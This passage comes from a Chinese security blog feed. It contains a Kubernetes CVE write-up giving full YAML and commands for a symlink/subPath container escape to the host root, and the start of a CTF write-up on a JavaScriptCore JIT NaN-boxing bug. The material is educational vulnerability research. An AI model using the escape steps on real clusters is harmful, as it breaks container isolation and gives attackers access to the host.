class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;864000&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>      <span class="hljs-attr">subPath:</span> <span class="hljs-string">malicious_link</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">Directory</span><br></code></pre></td></tr></table></figure><p>再进入pod，可以读取到 &#x2F; 下的文件，且这时候&#x2F;test就是主机的根目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /test/here_i_am.txt <br>Yeah!! I&#x27;m on the host&#x27;s root dir!!<br></code></pre></td></tr></table></figure><h2 id="真的环境搭建"><a href="#真的环境搭建" class="headerlink" title="真的环境搭建"></a>真的环境搭建</h2><p>创建策略，注意空格</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">extensions/v1beta1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PodSecurityPolicy</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">privileged</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">seccomp.security.alpha.kubernetes.io/allowedProfileNames:</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">privileged:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">allowPrivilegeEscalation:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">allowedCapabilities:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*&#x27;</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*&#x27;</span><br>  <span class="hljs-attr">allowedHostPaths:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">pathPrefix:</span> <span class="hljs-string">/tmp/</span><br>  <span class="hljs-string">hostNetwork:true</span><br>  <span class="hljs-attr">hostPorts:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">min:</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">max:</span> <span class="hljs-number">65535</span><br>  <span class="hljs-attr">hostIPC:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">hostPID:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">runAsUser:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">seLinux:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">supplementalGroups:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">fsGroup:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f policy.yaml</span><br></code></pre></td></tr></table></figure><p>打通RBAC</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br><span class="hljs-attr">metadata:</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">privileged-psp</span><br><span class="hljs-attr">rules:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">policy</span><br>   <span class="hljs-attr">resourceNames:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">privileged</span><br>   <span class="hljs-attr">resources:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">podsecuritypolicies</span><br>   <span class="hljs-attr">verbs:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">use</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">RoleBinding</span><br><span class="hljs-attr">metadata:</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">kube-system-psp</span><br> <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-attr">roleRef:</span><br> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br> <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">privileged-psp</span><br><span class="hljs-attr">subjects:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>   <span class="hljs-attr">kind:</span> <span class="hljs-string">Group</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">system:nodes</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>   <span class="hljs-attr">kind:</span> <span class="hljs-string">Group</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">system:serviceaccounts:kube-system</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f rbac.yaml --validate=<span class="hljs-literal">false</span></span><br></code></pre></td></tr></table></figure><p>手动编辑APIServer配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br><br><br>    - --admission-control=Initializers,NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,ResourceQuota,PodSecurityPolicy<br><br><br></code></pre></td></tr></table></figure><p>重启Kubelet服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo service kubelet restart</span><br></code></pre></td></tr></table></figure><p>尝试挂载宿主机根目录，失败</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f try.yaml</span> <br>Error from server (Forbidden): error when creating &quot;try.yaml&quot;: pods &quot;test&quot; is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: &quot;/&quot;: is not allowed to be used]<br></code></pre></td></tr></table></figure><p>尝试相对路径绕过，失败</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/../</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f try.yaml</span> <br>The Pod &quot;test&quot; is invalid: <br>* spec.volumes[0].hostPath.path: Invalid value: &quot;/tmp/../&quot;: must not contain &#x27;..&#x27;<br>* spec.containers[0].volumeMounts[0].name: Not found: &quot;vuln-vol&quot;<br></code></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>步骤：</p><ul><li>创建一个Pod，hostPath挂载&#x2F;tmp&#x2F;test</li><li>上一个Pod中，在宿主机&#x2F;tmp&#x2F;test目录下创建指向&#x2F;的符号链接xxx</li><li>创建第二个Pod，hostPath挂载&#x2F;tmp&#x2F;test，subPath挂载xxx</li><li>第二个Pod的shell中，chroot到xxx，实现容器逃逸</li></ul><p>第一个pod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stage-1-container</span><br><span class="hljs-attr">spec:</span><br> <span class="hljs-attr">containers:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">stage-1-container</span><br>   <span class="hljs-attr">volumeMounts:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/vuln</span><br>     <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>   <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>   <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br> <span class="hljs-attr">volumes:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>   <span class="hljs-attr">hostPath:</span><br>     <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br></code></pre></td></tr></table></figure><p>在第一个pod中创建符号链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it stage-1-container -- <span class="hljs-built_in">ln</span> -s / /vuln/xxx</span><br></code></pre></td></tr></table></figure><p>创建第二个pod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stage-2-container</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">stage-2-container</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/vuln</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>      <span class="hljs-attr">subPath:</span> <span class="hljs-string">xxx</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br></code></pre></td></tr></table></figure><p>进入第二个pod chroot，逃逸成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it stage-2-container -- /bin/sh</span><br>cat /etc/hostname<br>stage-2-container<br>chroot vuln<br>cat /etc/hostname<br>ubuntu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>K8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 阿里云CTF BadApple wp</title>
    <link href="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/"/>
    <url>/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/</url>
    
    <content type="html"><![CDATA[<p>头疼……背疼……失眠……好好好</p><span id="more"></span><p><a href="https://blog.exodusintel.com/2023/12/11/safari-hold-still-for-nan-minutes/">Safari, Hold Still for NaN Minutes!</a></p><p><em>疯狂describe忘记看diff，他tmd注释掉了啊！！！</em></p><h1 id="NaN-boxing"><a href="#NaN-boxing" class="headerlink" title="NaN-boxing"></a>NaN-boxing</h1><p>对象编码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *     Pointer &#123;  0000:PPPP:PPPP:PPPP</span><br><span class="hljs-comment"> *              / 0002:****:****:****</span><br><span class="hljs-comment"> *     Double  &#123;         ...</span><br><span class="hljs-comment"> *              \ FFFC:****:****:****</span><br><span class="hljs-comment"> *     Integer &#123;  FFFE:0000:IIII:IIII</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><ul><li>指针、布尔值等：高16位为0</li><li>双精度浮点数：高16位2~fffc，通过所有double加1&lt;&lt;49编码</li><li>32位整数：高16位fffe</li></ul><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><p>漏洞源于DFG JIT和FTL JIT优化和编译从浮点数组获取元素的方式</p><h2 id="snippet1"><a href="#snippet1" class="headerlink" title="snippet1"></a>snippet1</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> float_array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">10</span>) ;<br><span class="hljs-keyword">let</span> value = float_array[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>DFG编译第二行 <strong>从浮点数组中取元素</strong> 的语句时会调用以下函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileGetByValOnFloatTypedArray</span><span class="hljs-params">(Node* node, TypedArrayType type, <span class="hljs-type">const</span> ScopedLambda&lt;std::tuple&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat preferredFormat)&gt;&amp; prefix)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* …… */</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">elementSize</span>(type)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">loadFloat</span>(<span class="hljs-built_in">BaseIndex</span>(storageReg, propertyReg, TimesFour), resultReg);<br>        <span class="hljs-built_in">convertFloatToDouble</span>(resultReg, resultReg);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: &#123;<br>        <span class="hljs-comment">/* [1] */</span><br>        <span class="hljs-built_in">loadDouble</span>(<span class="hljs-built_in">BaseIndex</span>(storageReg, propertyReg, TimesEight), resultReg);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">RELEASE_ASSERT_NOT_REACHED</span>();<br>    &#125;<br>    <span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">if</span> (format == DataFormatJS) &#123;<br>        <span class="hljs-comment">/* [3] */</span><br>        <span class="hljs-comment">// purifyNaN(resultReg);</span><br>        <span class="hljs-built_in">boxDouble</span>(resultReg, resultRegs);<br>        <span class="hljs-built_in">jsValueResult</span>(resultRegs, node);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">ASSERT</span>(format == DataFormatDouble);<br>        <span class="hljs-built_in">doubleResult</span>(resultReg, node);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>从数组加载double到临时寄存器resultReg</p></li><li><p>检查参数format：</p><ul><li>DataFormatJS：加载的浮点数将用作JSValue，需要转化为JSValue</li><li>DataFormatDouble：加载的参数被用作浮点数，无需转化成JSValue</li></ul><p>获取format的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DataFormat format;<br>std::<span class="hljs-built_in">tie</span>(resultRegs, format, std::ignore) = <span class="hljs-built_in">prefix</span>(DataFormatDouble);<br></code></pre></td></tr></table></figure><p>既然是JIT猜测是使用过往行为判断浮点数用途</p></li><li><p>当format为DataFormatJS时，调用boxDouble将浮点数转换为JSValue</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">boxDouble</span><span class="hljs-params">(FPRReg fpr, JSValueRegs regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">boxDouble</span>(fpr, regs.<span class="hljs-built_in">tagGPR</span>(), regs.<span class="hljs-built_in">payloadGPR</span>());<br>&#125;<br><br><span class="hljs-function">GPRReg <span class="hljs-title">boxDouble</span><span class="hljs-params">(FPRReg fpr, GPRReg gpr, TagRegistersMode mode = HaveTagRegisters)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* [1] */</span><br>    <span class="hljs-built_in">moveDoubleTo64</span>(fpr, gpr);<br>    <span class="hljs-comment">/* [2] */</span><br>    <span class="hljs-keyword">if</span> (mode == DoNotHaveTagRegisters)<br>        <span class="hljs-built_in">sub64</span>(<span class="hljs-built_in">TrustedImm64</span>(JSValue::NumberTag), gpr);<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">sub64</span>(GPRInfo::numberTagRegister, gpr);<br>        <span class="hljs-built_in">jitAssertIsJSDouble</span>(gpr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> gpr;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>将double移入通用寄存器gpr</p></li><li><p>通过将gpr减JSValue::NumberTag将double编码为JSValue</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">int64_t</span> NumberTag = <span class="hljs-number">0xfffe000000000000</span>ll;<br></code></pre></td></tr></table></figure><p>加1&lt;&lt;49和减0xfffe000000000000效果相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">gpr = fpr                             <span class="hljs-comment">// [1] from the above snippet</span><br>gpr = gpr - JSValue::NumberTag;       <span class="hljs-comment">// [2] from the above snippet</span><br>=＞ gpr = <span class="hljs-number">0xfffe000012345678</span> - <span class="hljs-number">0xfffe000000000000</span>;<br>=＞ gpr = <span class="hljs-number">0xfffe000012345678</span> + <span class="hljs-number">0x0002000000000000</span>; <span class="hljs-comment">// taking 2&#x27;s complement</span><br>=＞ gpr = <span class="hljs-number">0x0000000012345678</span>; <span class="hljs-comment">// overflow happens and the top bit is discarded</span><br></code></pre></td></tr></table></figure></li></ul><p>假设控制double为形如0xfffe000012345678，编码后为0x0000000012345678会被当做指针解析</p><p>boxDouble假定参数为合法double或NaN即0x7ff8000000000000，题目中patch掉的purifyNaN就是检查这个</p><h2 id="snippet2"><a href="#snippet2" class="headerlink" title="snippet2"></a>snippet2</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">obj = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">y</span>:<span class="hljs-number">1</span>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">forin</span>(<span class="hljs-params">arg</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-keyword">let</span> out = arg[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>枚举obj中所有属性名称</li><li>从arg中取出对应属性名称的值</li></ul><p>执行arg[i]时会进入以下过程编译 <strong>获取对象的属性值</strong> 操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compile</span><span class="hljs-params">(Node* node)</span></span><br><span class="hljs-function">     <span class="hljs-comment">/* …… */</span></span><br><span class="hljs-function"><span class="hljs-keyword">case</span> EnumeratorGetByVal: &#123;</span><br>        <span class="hljs-built_in">compileEnumeratorGetByVal</span>(node);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">/* …… */</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SpeculativeJIT::compileEnumeratorGetByVal</span><span class="hljs-params">(Node* node)</span></span><br><span class="hljs-function"></span>&#123;<br>    Edge baseEdge = m_graph.<span class="hljs-built_in">varArgChild</span>(node, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">auto</span> generate = [&amp;] (JSValueRegs baseRegs) &#123;<br><span class="hljs-comment">/* …… */</span><br>        <br><span class="hljs-comment">/* [1] */</span><br>        <span class="hljs-built_in">compileGetByVal</span>(node, scopedLambda&lt;std::<span class="hljs-built_in">tuple</span>&lt;JSValueRegs, DataFormat, CanUseFlush&gt;(DataFormat)&gt;([&amp;] (DataFormat) &#123;<br><span 